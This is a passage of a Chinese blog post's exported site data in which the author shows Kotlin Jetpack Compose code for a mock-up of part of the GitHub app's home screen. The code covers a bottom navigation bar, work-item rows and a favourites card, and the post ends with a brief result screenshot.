<span class=\"token punctuation\">}</span>\n                            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                            label <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                            selected <span class=\"token operator\">=</span> selectedItem <span class=\"token operator\">==</span> index<span class=\"token punctuation\">,</span>\n                            onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> selectedItem <span class=\"token operator\">=</span> index <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n                    verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                    <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                        shape <span class=\"token operator\">=</span> CircleShape<span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                            painter <span class=\"token operator\">=</span> <span class=\"token function\">rememberImagePainter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> avatar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentScale <span class=\"token operator\">=</span> ContentScale<span class=\"token punctuation\">.</span>Crop\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">}</span>\n                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"主页\"</span><span class=\"token punctuation\">,</span>\n                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                            fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>sp\n                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">}</span>\n                <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                    text <span class=\"token operator\">=</span> <span class=\"token string\">\"我的工作\"</span><span class=\"token punctuation\">,</span>\n                    style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                        fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                        fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">,</span> bottom <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_issue_opened<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"议题\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF25CA25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_pull_request<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"拉取请求\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF11ABF1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_git_repository_line<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"仓库\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF8811F1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_organization<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"组织\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFFF18C11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">Divider</span><span class=\"token punctuation\">(</span>\n                    color <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Gray<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                    <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                        Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"收藏夹\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>bottom <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                            text <span class=\"token operator\">=</span> <span class=\"token string\">\"将仓库加入收藏夹以便随时快速访问，而无需搜索\"</span><span class=\"token punctuation\">,</span>\n                            style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">)</span>\n                        <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                            modifier <span class=\"token operator\">=</span> Modifier\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            horizontalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterHorizontally\n                        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                            <span class=\"token function\">Card</span><span class=\"token punctuation\">(</span>\n                                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>horizontal <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n                            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                <span class=\"token function\">Button</span><span class=\"token punctuation\">(</span>\n                                    onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token comment\">/*TODO*/</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n                                    elevation <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">fillMaxWidth</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                    colors <span class=\"token operator\">=</span> ButtonDefaults<span class=\"token punctuation\">.</span><span class=\"token function\">buttonColors</span><span class=\"token punctuation\">(</span>\n                                        backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>Transparent\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"添加收藏\"</span><span class=\"token punctuation\">,</span>\n                                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">14</span><span class=\"token punctuation\">.</span>sp<span class=\"token punctuation\">,</span>\n                                            color <span class=\"token operator\">=</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF229DD5</span><span class=\"token punctuation\">)</span>\n                                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                                    <span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">}</span>\n                            <span class=\"token punctuation\">}</span>\n                        <span class=\"token punctuation\">}</span>\n                    <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>\n        icon<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        text<span class=\"token operator\">:</span> String<span class=\"token punctuation\">,</span>\n        color<span class=\"token operator\">:</span> Color\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n            Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>vertical <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 圆角icon</span>\n            <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                shape <span class=\"token operator\">=</span> <span class=\"token function\">RoundedCornerShape</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>end <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n                <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                    painter <span class=\"token operator\">=</span> <span class=\"token function\">painterResource</span><span class=\"token punctuation\">(</span>id <span class=\"token operator\">=</span> icon<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                        <span class=\"token punctuation\">.</span><span class=\"token function\">background</span><span class=\"token punctuation\">(</span>color<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    colorFilter <span class=\"token operator\">=</span> ColorFilter<span class=\"token punctuation\">.</span><span class=\"token function\">tint</span><span class=\"token punctuation\">(</span>Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                text <span class=\"token operator\">=</span> text<span class=\"token punctuation\">,</span>\n                style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                    fontSize <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">.</span>sp\n                <span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token annotation builtin\">@Preview</span>\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Preview</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"效果\"><a href=\"#效果\" class=\"headerlink\" title=\"效果\"></a>效果</h2><p>感觉还行，学习一上午Compose的成果</p>\n<p><img src=\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/Screenshot_2021-12-24-22-32-59-446_kim.bifrost.co.jpg\"></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"初试Jetpack-Compose\"><a href=\"#初试Jetpack-Compose\" class=\"headerlink\" title=\"初试Jetpack Compose\"></a>初试Jetpack Compose</h1><p>今天写WanAndroid写得头晕目眩，便想换换脑子学点别的东西，于是我去了解了一下<em><strong>Jetpack Compose</strong></em>。并尝试用它仿写了Github App的部分内容。</p>\n<p>我一向是对DSL风格的编程十分向往的，因为我感觉这样写代码就跟写诗一样优雅。而UI编程其实一直是我的痛点。曾经在Minecraft插件开发中，我是很不擅长编写UI的。所幸Android提供了一套xml语法糖来将大部分UI逻辑与逻辑代码分离，让我对Android的ui开发还算得心应手，但我仍然十分向往使用逻辑代码来构造UI界面。于是我听说了Jetpack Compose，一种使用DSL风格的Jetpack UI框架，直接戳爆了我。</p>\n<p>于是在一个上午，我被我写的WanAndroid的代码恶心得死去活来，气得关闭了Android Studio。想着刷刷掘金，看到了一篇Compose的文章，于是就学了一上午的Compose，然后有了这个demo。</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> MainActivity <span class=\"token operator\">:</span> <span class=\"token function\">ComponentActivity</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token operator\">:</span> Bundle<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">onCreate</span><span class=\"token punctuation\">(</span>savedInstanceState<span class=\"token punctuation\">)</span>\n        setContent <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">ComposeTestTheme</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token annotation builtin\">@Composable</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span>\n        avatar<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token string\">\"https://gitee.com/coldrain-moro/images_bed/raw/master/images/chino.jpg\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> selectedItem <span class=\"token keyword\">by</span> remember <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">mutableStateOf</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">val</span> items <span class=\"token operator\">=</span> <span class=\"token function\">listOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"主页\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"通知\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"搜索\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token function\">Scaffold</span><span class=\"token punctuation\">(</span>\n            bottomBar <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">BottomNavigation</span><span class=\"token punctuation\">(</span>\n                    backgroundColor <span class=\"token operator\">=</span> Color<span class=\"token punctuation\">.</span>White<span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">height</span><span class=\"token punctuation\">(</span><span class=\"token number\">50</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    items<span class=\"token punctuation\">.</span><span class=\"token function\">forEachIndexed</span> <span class=\"token punctuation\">&#123;</span> index<span class=\"token punctuation\">,</span> item <span class=\"token operator\">-></span>\n                        <span class=\"token function\">BottomNavigationItem</span><span class=\"token punctuation\">(</span>\n                            icon <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                                <span class=\"token keyword\">when</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                                    <span class=\"token number\">0</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Home<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token number\">1</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Notifications<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                    <span class=\"token keyword\">else</span> <span class=\"token operator\">-></span> <span class=\"token function\">Icon</span><span class=\"token punctuation\">(</span>Icons<span class=\"token punctuation\">.</span>Filled<span class=\"token punctuation\">.</span>Search<span class=\"token punctuation\">,</span> contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span>\n                                <span class=\"token punctuation\">&#125;</span>\n                            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                            label <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                            selected <span class=\"token operator\">=</span> selectedItem <span class=\"token operator\">==</span> index<span class=\"token punctuation\">,</span>\n                            onClick <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> selectedItem <span class=\"token operator\">=</span> index <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">Column</span><span class=\"token punctuation\">(</span>\n                Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token function\">Row</span><span class=\"token punctuation\">(</span>\n                    verticalAlignment <span class=\"token operator\">=</span> Alignment<span class=\"token punctuation\">.</span>CenterVertically\n                <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                    <span class=\"token function\">Surface</span><span class=\"token punctuation\">(</span>\n                        shape <span class=\"token operator\">=</span> CircleShape<span class=\"token punctuation\">,</span>\n                    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token function\">Image</span><span class=\"token punctuation\">(</span>\n                            painter <span class=\"token operator\">=</span> <span class=\"token function\">rememberImagePainter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">data</span> <span class=\"token operator\">=</span> avatar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentDescription <span class=\"token operator\">=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">,</span>\n                            modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                            contentScale <span class=\"token operator\">=</span> ContentScale<span class=\"token punctuation\">.</span>Crop\n                        <span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                    <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                        text <span class=\"token operator\">=</span> <span class=\"token string\">\"主页\"</span><span class=\"token punctuation\">,</span>\n                        style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                            fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                            fontSize <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>sp\n                        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                        modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span><span class=\"token number\">15</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token function\">Text</span><span class=\"token punctuation\">(</span>\n                    text <span class=\"token operator\">=</span> <span class=\"token string\">\"我的工作\"</span><span class=\"token punctuation\">,</span>\n                    style <span class=\"token operator\">=</span> <span class=\"token function\">TextStyle</span><span class=\"token punctuation\">(</span>\n                        fontWeight <span class=\"token operator\">=</span> FontWeight<span class=\"token punctuation\">.</span>Bold<span class=\"token punctuation\">,</span>\n                        fontSize <span class=\"token operator\">=</span> <span class=\"token number\">16</span><span class=\"token punctuation\">.</span>sp\n                    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                    modifier <span class=\"token operator\">=</span> Modifier<span class=\"token punctuation\">.</span><span class=\"token function\">padding</span><span class=\"token punctuation\">(</span>top <span class=\"token operator\">=</span> <span class=\"token number\">30</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">,</span> bottom <span class=\"token operator\">=</span> <span class=\"token number\">20</span><span class=\"token punctuation\">.</span>dp<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_issue_opened<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> <span class=\"token string\">\"议题\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">Color</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xFF25CA25</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token function\">WorkSelection</span><span class=\"token punctuation\">(</span>icon <span class=\"token operator\">=</span> R<span class=\"token punctuation\">.</span>drawable<span class=\"token punctuation\">.</span>ic_pull_request<span class=\"token punctuation\">,</span> text <span class=\"token operator\">=</span> 